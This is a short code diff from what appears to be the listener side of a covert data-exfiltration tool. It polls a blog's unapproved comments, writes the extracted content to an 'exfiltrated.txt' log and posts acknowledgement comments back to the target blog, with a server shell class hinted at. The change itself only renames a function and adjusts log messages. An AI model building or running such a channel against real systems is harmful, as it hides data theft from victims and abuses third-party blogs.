@@ -38,7 +38,7 @@ for i in range(1, 4):
     clients.append(client)
     print("## Created client with id: " + str(client.id))
 
-def ThreadStartListener():
+def thread_start_listener():
     if recv_config.prev_unapproved_index == 0:
         recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
 
@@ -50,18 +50,18 @@ def ThreadStartListener():
         for exfil_content in received_data:
             to_write = str(datetime.datetime.utcnow()) + ": "
             to_write += "Extracted data with timeslot of " + str(recv_config.recv_time_slot) + ": " + exfil_content + "\n"
-            print("[INFO] " + to_write);
+            print("[INFO] thread_start_listener: " + to_write);
             f = open("../output/exfiltrated.txt", "a")
             f.write(to_write)
             f.close()
 
             message_id = exfil_content.split(":")[0]
-            print("[INFO] Extracted message_id is " + message_id)
+            print("[INFO] thread_start_listener: Extracted message_id is " + message_id)
             submit_comment(channel.target_blog, channel.ack_channel_id, message_id)
 
         loop_counter -= 1
 
-threading.Thread(target=ThreadStartListener).start()
+threading.Thread(target=thread_start_listener).start()
 time.sleep(1)
 
 class ServerShell(cmd.Cmd):
